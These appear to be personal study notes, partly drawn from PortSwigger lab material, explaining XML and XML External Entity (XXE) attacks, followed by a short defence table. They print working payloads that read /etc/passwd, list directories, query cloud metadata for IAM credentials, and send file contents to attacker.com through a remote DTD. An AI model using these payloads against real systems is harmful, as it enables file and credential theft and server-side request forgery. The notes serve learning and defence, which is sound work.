XML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology.

- **Data Representation through Entities**: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `<` and `>` to avoid conflict with XML's tag system.
- **Defining XML Elements**: XML allows for the definition of element types, outlining how elements should be structured and what content they may contain, ranging from any type of content to specific child elements.
- **Document Type Definition (DTD)**: DTDs are crucial in XML for defining the document's structure and the types of data it can contain. They can be internal, external, or a combination, guiding how documents are formatted and validated.
- **Custom and External Entities**: XML supports the creation of custom entities within a DTD for flexible data representation. External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **XXE Detection with Parameter Entities**: For detecting XXE vulnerabilities, especially when conventional methods fail due to parser security measures, XML parameter entities can be utilized. These entities allow for out-of-band detection techniques, such as triggering DNS lookups or HTTP requests to a controlled domain, to confirm the vulnerability.
    - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
    - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## attacks

##  Entity test

In this attack I'm going to test if a simple new ENTITY declaration is working

xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ENTITY toreplace "3"> ]> <stockCheck>     <productId>&toreplace;</productId>     <storeId>1</storeId> </stockCheck>


![[Pasted image 20250618210714.png]]


## XXE element

### DOCTYPE = <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
### XInclude = foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>



## XXE  Read file
Lets try to read `/etc/passwd` in different ways. For Windows you could try to read: `C:\windows\system32\drivers\etc\hosts`

In this first case notice that SYSTEM "_**file:///**etc/passwd_" will also work.



<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>

![[Pasted image 20250618210900.png]]
## Directory listing
<!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>

## SSRF
An XXE could be used to abuse a SSRF inside a cloud
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>


## Blind SSRF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>


# Blind XXE with out-of-band interaction

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

- You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
- You can trigger XML parsing errors in such a way that the error messages contain sensitive data


### out-of-band
Out-of-band" refers to **interactions that occur outside the normal request/response cycle** between a client (like a browser or tool) and a server (web application). These interactions are often used to detect vulnerabilities that don’t immediately return visible data or errors—such as Blind XXE.

## Detecting blind XXE using out-of-band (OAST) techniques

You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

## seccound method 

 **XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:**

![[Pasted image 20250620235215.png]]
## block input id  bypasss

**bypasss** <!ENTITY % myparameterentity "my parameter entity value"%myparameterentity; >

![[Pasted image 20250620235524.png]]
### malicious DTD injection xml external entity


### what is DTD
DTD stands for Document Type Definition.
A DTD defines the structure and the legal elements and attributes of an XML document.

### injection dtd 

### DTD Two type injrction 

#### Remote File Inclusion):

xml

`<?xml version="1.0"?> <!DOCTYPE root [   <!ENTITY xxe SYSTEM "http://malicious-remote-server.com/data"> ]> <root>&xxe;</root>`

- **Remote Impact**: Sends a request to a malicious server, allowing:
    
    - **Exfiltration of internal files** via URLs.
        
    - **Server-side request forgery (SSRF)** to internal systems.
        
    - Sometimes RCE, depending on the parser and configuration.
        

---

### 2. **Parameter Entity Injection**

**Definition**: This exploits DTD parameter entities (used for DTD modularization). If external parameter entities are allowed, attackers can define malicious DTDs hosted on remote servers.

#### 💡  (Remote DTD Fetching):

xml
`<?xml version="1.0"?> <!DOCTYPE root [   <!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd">   %ext; ]> <root></root>`

**malicious.dtd content:**

xml
`<!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%data;'>"> %eval;`

- **Remote Impact**:
    
    - Pulls in an external DTD.
        
    - Triggers internal file read and exfiltration.
        
    - Used for **advanced XXE chaining attacks**.


### **Local DTD Injection (Parameter Entity Injection with Local Resources)**

This type uses **parameter entities** to craft payloads referencing local files or abusing internal DTDs for further injection.

#### 💡 Example:

xml
`<?xml version="1.0"?> <!DOCTYPE data [   <!ENTITY % local SYSTEM "file:///usr/share/xml/entities.dtd">   %local; ]> <data>test</data>`

- **What it does**:
    
    - Includes a local DTD file.
        
    - Can be chained to load internal DTDs that might contain further sensitive entities or even trigger execution if mishandled.
        
- In advanced attacks: The local DTD could be maliciously altered, or the attacker uses it in a chain to extract more local data or even trigger logic bugs in the parser.


# XXE Defense

## **XXE Defense Cheat Sheet**

|Technique|Effectiveness|Notes|
|---|---|---|
|Disable DTDs|✅ High|Most effective prevention|
|Disable external entity resolution|✅ High|Stops file/network access|
|Use safe parsers|✅ High|Use `defusedxml`, `javax.xml.XMLConstants`|
|Switch to JSON|✅ High|Eliminates XML attack surface|
|Sandbox parser|✅ Medium|Reduces impact if exploited|
|Logging & monitoring|✅ Medium|Detects exploitation attempts|


